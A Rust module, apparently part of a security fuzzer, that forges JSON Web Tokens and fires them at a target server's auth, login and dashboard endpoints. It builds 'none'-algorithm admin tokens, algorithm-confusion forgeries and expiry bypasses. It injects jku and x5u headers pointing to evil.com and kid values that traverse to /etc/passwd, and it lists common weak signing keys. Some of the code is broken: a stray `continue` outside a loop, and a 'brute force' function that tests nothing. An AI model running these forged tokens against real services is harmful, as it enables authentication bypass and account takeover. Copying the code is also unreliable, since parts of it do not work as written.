use crate::fuzzer::payloads::{Payload, PayloadType, Severity};
use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine as _};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Instant;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum JwtVulnerability {
    NoneAlgorithm,
    AlgorithmConfusion,
    WeakSigning,
    KeyInjection,
    ExpClaimBypass,
    NbfClaimBypass,
    JkuInjection,
    X5cInjection,
    KidInjection,
    InvalidSignature,
}

impl std::fmt::Display for JwtVulnerability {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            JwtVulnerability::NoneAlgorithm => write!(f, "None Algorithm"),
            JwtVulnerability::AlgorithmConfusion => write!(f, "Algorithm Confusion (RS to HS)"),
            JwtVulnerability::WeakSigning => write!(f, "Weak Signing Key"),
            JwtVulnerability::KeyInjection => write!(f, "Key Injection"),
            JwtVulnerability::ExpClaimBypass => write!(f, "Expiration Bypass"),
            JwtVulnerability::NbfClaimBypass => write!(f, "Not Before Bypass"),
            JwtVulnerability::JkuInjection => write!(f, "JKU Header Injection"),
            JwtVulnerability::X5cInjection => write!(f, "X5C Header Injection"),
            JwtVulnerability::KidInjection => write!(f, "KID Header Injection"),
            JwtVulnerability::InvalidSignature => write!(f, "Invalid Signature"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwtTestResult {
    pub vulnerability: JwtVulnerability,
    pub success: bool,
    pub token: String,
    pub description: String,
    pub severity: Severity,
}

pub struct JwtFuzzer {
    pub public_key: Option<String>,
    pub target_url: Option<String>,
    pub client: Option<Client>,
    pub original_token: Option<String>,
}

impl Default for JwtFuzzer {
    fn default() -> Self {
        Self::new()
    }
}

impl JwtFuzzer {
    pub fn new() -> Self {
        Self {
            public_key: None,
            target_url: None,
            client: None,
            original_token: None,
        }
    }

    pub fn with_target_url(mut self, url: String) -> Self {
        self.target_url = Some(url);
        self
    }

    pub fn with_client(mut self, client: Client) -> Self {
        self.client = Some(client);
        self
    }

    pub fn with_original_token(mut self, token: String) -> Self {
        self.original_token = Some(token);
        self
    }

    pub fn with_public_key(mut self, key: String) -> Self {
        self.public_key = Some(key);
        self
    }

    pub fn parse_token(&self, token: &str) -> Option<JwtParts> {
        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() != 3 {
            return None;
        }

        let header = match decode_jwt_part(parts[0]) {
            Ok(h) => h,
            Err(_) => return None,
        };

        let payload = match decode_jwt_part(parts[1]) {
            Ok(p) => p,
            Err(_) => return None,
        };

        Some(JwtParts {
            header,
            payload,
            signature: parts[2].to_string(),
        })
    }

    pub fn test_none_algorithm(&self) -> Vec<JwtTestResult> {
        let mut results = Vec::new();

        let header = serde_json::json!({
            "alg": "none",
            "typ": "JWT"
        });

        let payload = serde_json::json!({
            "sub": "admin",
            "role": "admin",
            "admin": true,
            "iss": "test"
        });

        let token = format!(
            "{}.{}.{}",
            URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
            URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes()),
            ""
        );

        results.push(JwtTestResult {
            vulnerability: JwtVulnerability::NoneAlgorithm,
            success: false,
            token: token.clone(),
            description: "Token with 'none' algorithm - signature bypass".to_string(),
            severity: Severity::Critical,
        });

        let variations = vec![
            serde_json::json!({"alg": "NONE", "typ": "JWT"}),
            serde_json::json!({"alg": "None", "typ": "JWT"}),
            serde_json::json!({"alg": "nOnE", "typ": "JWT"}),
            serde_json::json!({"alg": "null", "typ": "JWT"}),
            serde_json::json!({}),
        ];

        for var_header in variations {
            let token = format!(
                "{}.{}.{}",
                URL_SAFE_NO_PAD.encode(var_header.to_string().as_bytes()),
                URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes()),
                ""
            );

            results.push(JwtTestResult {
                vulnerability: JwtVulnerability::NoneAlgorithm,
                success: false,
                token,
                description: format!("None algorithm variation: {:?}", var_header.get("alg")),
                severity: Severity::Critical,
            });
        }

        results
    }

    pub fn test_algorithm_confusion(&self, token: &str) -> Vec<JwtTestResult> {
        let mut results = Vec::new();

        if let Some(parts) = self.parse_token(token) {
            let mut header = match serde_json::from_str::<serde_json::Value>(&parts.header) {
                Ok(h) => h,
                Err(e) => {
                    tracing::warn!("failed to parse JWT header: {}", e);
                    continue;
                }
            };

            header["alg"] = serde_json::json!("HS256");

            let forged_token = format!(
                "{}.{}.{}",
                URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
                parts.payload,
                "fake_signature"
            );

            results.push(JwtTestResult {
                vulnerability: JwtVulnerability::AlgorithmConfusion,
                success: false,
                token: forged_token,
                description: "RS256 changed to HS256 - possible algorithm confusion".to_string(),
                severity: Severity::Critical,
            });

            header["alg"] = serde_json::json!("HS384");
            let forged_token = format!(
                "{}.{}.{}",
                URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
                parts.payload,
                "fake_signature"
            );

            results.push(JwtTestResult {
                vulnerability: JwtVulnerability::AlgorithmConfusion,
                success: false,
                token: forged_token,
                description: "RS384 changed to HS384".to_string(),
                severity: Severity::Critical,
            });

            header["alg"] = serde_json::json!("HS512");
            let forged_token = format!(
                "{}.{}.{}",
                URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
                parts.payload,
                "fake_signature"
            );

            results.push(JwtTestResult {
                vulnerability: JwtVulnerability::AlgorithmConfusion,
                success: false,
                token: forged_token,
                description: "RS512 changed to HS512".to_string(),
                severity: Severity::Critical,
            });
        }

        results
    }

    pub fn test_claim_bypass(&self) -> Vec<JwtTestResult> {
        let mut results = Vec::new();

        let payloads = vec![
            (
                serde_json::json!({
                    "sub": "admin",
                    "exp": 0,
                    "iat": 0
                }),
                "exp=0 bypass",
            ),
            (
                serde_json::json!({
                    "sub": "admin",
                    "exp": 9999999999i64,
                    "iat": 9999999999i64
                }),
                "Far future exp",
            ),
            (
                serde_json::json!({
                    "sub": "admin",
                    "nbf": 0i64,
                    "iat": 0i64
                }),
                "nbf=0 bypass",
            ),
            (
                serde_json::json!({
                    "sub": "admin",
                    "nbf": 9999999999i64,
                    "iat": 9999999999i64
                }),
                "Future nbf",
            ),
            (
                serde_json::json!({
                    "sub": "admin",
                    "exp": serde_json::Value::Null
                }),
                "null exp",
            ),
            (
                serde_json::json!({
                    "sub": "admin"
                }),
                "Missing exp claim",
            ),
        ];

        let header = serde_json::json!({
            "alg": "HS256",
            "typ": "JWT"
        });

        for (payload, desc) in payloads {
            let token = format!(
                "{}.{}.signature",
                URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
                URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes())
            );

            results.push(JwtTestResult {
                vulnerability: JwtVulnerability::ExpClaimBypass,
                success: false,
                token,
                description: desc.to_string(),
                severity: Severity::Medium,
            });
        }

        results
    }

    pub fn test_key_injection(&self, token: &str) -> Vec<JwtTestResult> {
        let mut results = Vec::new();

        if let Some(parts) = self.parse_token(token) {
            let jku_injections = vec![("jku", "https://evil.com/jwks.json")];
            for (key, value) in jku_injections {
                let mut header = match serde_json::from_str::<serde_json::Value>(&parts.header) {
                    Ok(h) => h,
                    Err(e) => {
                        tracing::warn!("failed to parse JWT header: {}", e);
                        continue;
                    }
                };
                header[key] = serde_json::json!(value);

                let token = format!(
                    "{}.{}.signature",
                    URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
                    parts.payload
                );

                results.push(JwtTestResult {
                    vulnerability: JwtVulnerability::JkuInjection,
                    success: false,
                    token,
                    description: format!("Key injection via {} header", key),
                    severity: Severity::High,
                });
            }

            let x5u_injections = vec![("x5u", "https://evil.com/cert.pem")];
            for (key, value) in x5u_injections {
                let mut header = match serde_json::from_str::<serde_json::Value>(&parts.header) {
                    Ok(h) => h,
                    Err(e) => {
                        tracing::warn!("failed to parse JWT header: {}", e);
                        continue;
                    }
                };
                header[key] = serde_json::json!(value);

                let token = format!(
                    "{}.{}.signature",
                    URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
                    parts.payload
                );

                results.push(JwtTestResult {
                    vulnerability: JwtVulnerability::X5cInjection,
                    success: false,
                    token,
                    description: format!("Key injection via {} header", key),
                    severity: Severity::High,
                });
            }

            let x5c_injections = vec![("x5c", "MIIBkTCB+wIJAKbO...")];
            for (key, value) in x5c_injections {
                let mut header = match serde_json::from_str::<serde_json::Value>(&parts.header) {
                    Ok(h) => h,
                    Err(e) => {
                        tracing::warn!("failed to parse JWT header: {}", e);
                        continue;
                    }
                };
                header[key] = serde_json::json!([value]);

                let token = format!(
                    "{}.{}.signature",
                    URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
                    parts.payload
                );

                results.push(JwtTestResult {
                    vulnerability: JwtVulnerability::X5cInjection,
                    success: false,
                    token,
                    description: format!("Key injection via {} header", key),
                    severity: Severity::High,
                });
            }

            let kid_injections = vec![
                ("kid", "../../../etc/passwd"),
                ("kid", "..\\..\\..\\windows\\win.ini"),
                ("kid", "12"),
            ];
            for (key, value) in kid_injections {
                let mut header = match serde_json::from_str::<serde_json::Value>(&parts.header) {
                    Ok(h) => h,
                    Err(e) => {
                        tracing::warn!("failed to parse JWT header: {}", e);
                        continue;
                    }
                };
                header[key] = serde_json::json!(value);

                let token = format!(
                    "{}.{}.signature",
                    URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
                    parts.payload
                );

                results.push(JwtTestResult {
                    vulnerability: JwtVulnerability::KidInjection,
                    success: false,
                    token,
                    description: format!("Key injection via {} header", key),
                    severity: Severity::High,
                });
            }

            let jwk_injections = vec![("jwk", r#"{"kty":"oct","k":"test"}"#)];
            for (key, value) in jwk_injections {
                let mut header: serde_json::Value =
                    serde_json::from_str(&parts.header).unwrap_or_default();
                header[key] = serde_json::json!(value);

                let token = format!(
                    "{}.{}.signature",
                    URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
                    parts.payload
                );

                results.push(JwtTestResult {
                    vulnerability: JwtVulnerability::KeyInjection,
                    success: false,
                    token,
                    description: format!("Key injection via {} header", key),
                    severity: Severity::High,
                });
            }
        }

        results
    }

    pub fn brute_force_weak_key(&self, _token: &str) -> Vec<JwtTestResult> {
        let mut results = Vec::new();

        let weak_keys = vec![
            "secret",
            "key",
            "123456",
            "password",
            "admin",
            "test",
            "12345678",
            "qwerty",
            "letmein",
            "1234567890",
            "secret123",
            "password123",
            "changeme",
            "default",
            "guest",
            "root",
            "toor",
            "1234",
            "12345",
            "admin123",
        ];

        for key in weak_keys {
            results.push(JwtTestResult {
                vulnerability: JwtVulnerability::WeakSigning,
                success: false,
                token: format!("Testing with key: {}", key),
                description: format!("Weak signing key: {}", key),
                severity: Severity::Critical,
            });
        }

        results
    }

    pub async fn test_token_against_server(&mut self, token: &str) -> Vec<JwtTestResult> {
        let mut results = Vec::new();

        let client = match &self.client {
            Some(c) => c,
            None => return results,
        };

        let target_url = match &self.target_url {
            Some(url) => url,
            None => return results,
        };

        let test_endpoints = vec![
            format!("{}/auth", target_url),
            format!("{}/login", target_url),
            format!("{}/api/auth", target_url),
            format!("{}/api/login", target_url),
            format!("{}/api/v1/auth", target_url),
            format!("{}/user", target_url),
            format!("{}/api/user", target_url),
            format!("{}/dashboard", target_url),
            target_url.clone(),
        ];

        for endpoint in test_endpoints {
            let start = Instant::now();

            let response = client
                .get(&endpoint)
                .header("Authorization", format!("Bearer {}", token))
                .send()
                .await;

            let elapsed = start.elapsed().as_millis() as u64;

            match response {
                Ok(resp) => {
                    let status = resp.status().as_u16();

                    if status == 200 || status == 201 {
                        results.push(JwtTestResult {
                            vulnerability: JwtVulnerability::InvalidSignature,
                            success: true,
                            token: format!("{} | Endpoint: {}", token, endpoint),
                            description: format!(
                                "Token accepted by {} - status {}",
                                endpoint, status
                            ),
                            severity: Severity::Critical,
                        });
                    } else if status == 401 || status == 403 {
                        results.push(JwtTestResult {
                            vulnerability: JwtVulnerability::InvalidSignature,
                            success: false,
                            token: format!("{} | Endpoint: {}", token, endpoint),
                            description: format!(
                                "Token rejected by {} - status {}",
                                endpoint, status
                            ),
                            severity: Severity::Info,
                        });
                    } else if status == 500 {
                        results.push(JwtTestResult {
                            vulnerability: JwtVulnerability::InvalidSignature,
                            success: false,
                            token: format!("{} | Endpoint: {}", token, endpoint),
                            description: format!(
                                "Server error on {} - possible algorithm confusion attack",
                                endpoint
                            ),
                            severity: Severity::High,
                        });
                    }
                }
                Err(e) => {
                    if e.is_timeout() {
                        results.push(JwtTestResult {
                            vulnerability: JwtVulnerability::InvalidSignature,
                            success: false,
                            token: format!("{} | Endpoint: {}", token, endpoint),
                            description: format!("Request timeout after {}ms", elapsed),
                            severity: Severity::Info,
                        });
                    }
                }
            }
        }

        results
    }

    pub async fn test_none_algorithm_attack(&mut self) -> Vec<JwtTestResult> {
        let mut results = Vec::new();

        let client = match &self.client {
            Some(c) => c,
            None => return results,
        };

        let target_url = match &self.target_url {
            Some(url) => url,
            None => return results,
        };

        let header = serde_json::json!({
            "alg": "none",
            "typ": "JWT"
        });

        let payload = serde_json::json!({
            "sub": "admin",
            "role": "admin",
            "admin": true,
        });

        let token = format!(
            "{}.{}.{}",
            URL_SAFE_NO_PAD.encode(header.to_string().as_bytes()),
            URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes()),
            ""
        );

        let endpoints = vec![
            format!("{}/auth", target_url),
            format!("{}/login", target_url),
            format!("{}/api/auth", target_url),
            target_url.clone(),
        ];

        for endpoint in endpoints {
            let response = client
                .get(&endpoint)
                .header("Authorization", format!("Bearer {}", token))
                .send()
                .await;

            match response {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    if status == 200 || status == 201 {
                        results.push(JwtTestResult {
                            vulnerability: JwtVulnerability::NoneAlgorithm,
                            success: true,
                            token: token.clone(),
                            description: format!(
                                "None algorithm attack SUCCEEDED on {}!",
                                endpoint
                            ),
                            severity: Severity::Critical,
                        });
                        break;
                    }
                }
                Err(_) => continue,
            }
        }

        results
    }
}

fn decode_jwt_part(part: &str) -> Result<String, Box<dyn std::error::Error>> {
    let decoded = URL_SAFE_NO_PAD.decode(part.as_bytes())?;
    Ok(String::from_utf8(decoded)?)
}

#[derive(Debug, Clone)]
pub struct JwtParts {
    pub header: String,
    pub payload: String,
    pub signature: String,
}

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let none_alg_header = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"alg":"none","typ":"JWT"}"#);
    let payload = base64::Engine::encode(&URL_SAFE_NO_PAD, r#"{"sub":"admin","admin":true}"#);

    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: format!("{}.{}.", none_alg_header, payload),
        description: "JWT none algorithm bypass".to_string(),
        severity: Severity::Critical,
        tags: vec!["jwt".to_string(), "bypass".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "alg=HS256".to_string(),
        description: "Algorithm confusion RS256->HS256".to_string(),
        severity: Severity::Critical,
        tags: vec!["jwt".to_string(), "algorithm_confusion".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "exp=9999999999".to_string(),
        description: "Far future expiration".to_string(),
        severity: Severity::Medium,
        tags: vec!["jwt".to_string(), "expiration".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Jwt,
        payload: "jku=https://evil.com/jwks.json".to_string(),
        description: "JKU header injection".to_string(),
        severity: Severity::High,
        tags: vec!["jwt".to_string(), "injection".to_string()],
    });

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "JWT payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_jwt_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Jwt);
        }
    }

    #[test]
    fn contains_none_algorithm_payload() {
        let payloads = get_payloads();
        let has_none = payloads
            .iter()
            .any(|p| p.payload.contains("none") || p.description.to_lowercase().contains("none"));
        assert!(has_none, "Must contain 'none' algorithm bypass payload");
    }

    #[test]
    fn none_algorithm_payload_is_valid_jwt_format() {
        let payloads = get_payloads();
        let none_payload = payloads
            .iter()
            .find(|p| p.description.contains("none algorithm"))
            .expect("Must have none algorithm payload");
        let parts: Vec<&str> = none_payload.payload.split('.').collect();
        assert_eq!(
            parts.len(),
            3,
            "None algorithm token must have 3 JWT parts (header.payload.signature)"
        );
    }

    #[test]
    fn none_algorithm_is_critical() {
        let payloads = get_payloads();
        let none = payloads
            .iter()
            .find(|p| p.description.contains("none algorithm"))
            .unwrap();
        assert_eq!(
            none.severity,
            Severity::Critical,
            "None algorithm bypass must be Critical"
        );
    }

    #[test]
    fn contains_algorithm_confusion() {
        let payloads = get_payloads();
        let has_confusion = payloads
            .iter()
            .any(|p| p.description.to_lowercase().contains("confusion"));
        assert!(
            has_confusion,
            "Must contain algorithm confusion (RS->HS) payload"
        );
    }

    #[test]
    fn contains_jku_injection() {
        let payloads = get_payloads();
        let has_jku = payloads
            .iter()
            .any(|p| p.payload.contains("jku") || p.description.to_lowercase().contains("jku"));
        assert!(has_jku, "Must contain JKU header injection payload");
    }

    #[test]
    fn contains_expiration_bypass() {
        let payloads = get_payloads();
        let has_exp = payloads.iter().any(|p| {
            p.payload.contains("exp=") || p.description.to_lowercase().contains("expiration")
        });
        assert!(has_exp, "Must contain expiration claim bypass payload");
    }

    #[test]
    fn fuzzer_test_none_algorithm_generates_tokens() {
        let fuzzer = JwtFuzzer::new();
        let results = fuzzer.test_none_algorithm();
        assert!(
            results.len() >= 5,
            "Must generate multiple none algorithm variations"
        );
        assert!(results
            .iter()
            .all(|r| r.vulnerability == JwtVulnerability::NoneAlgorithm));
    }

    #[test]
    fn fuzzer_brute_force_has_weak_keys() {
        let fuzzer = JwtFuzzer::new();
        let results = fuzzer.brute_force_weak_key("dummy");
        assert!(
            results.len() >= 15,
            "Must test at least 15 weak signing keys"
        );
        assert!(results
            .iter()
            .all(|r| r.vulnerability == JwtVulnerability::WeakSigning));
    }

    #[test]
    fn fuzzer_claim_bypass_generates_tokens() {
        let fuzzer = JwtFuzzer::new();
        let results = fuzzer.test_claim_bypass();
        assert!(
            results.len() >= 4,
            "Must generate multiple claim bypass tokens"
        );
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 3,
            "Must have JWT payload coverage, got {}",
            payloads.len()
        );
    }
}
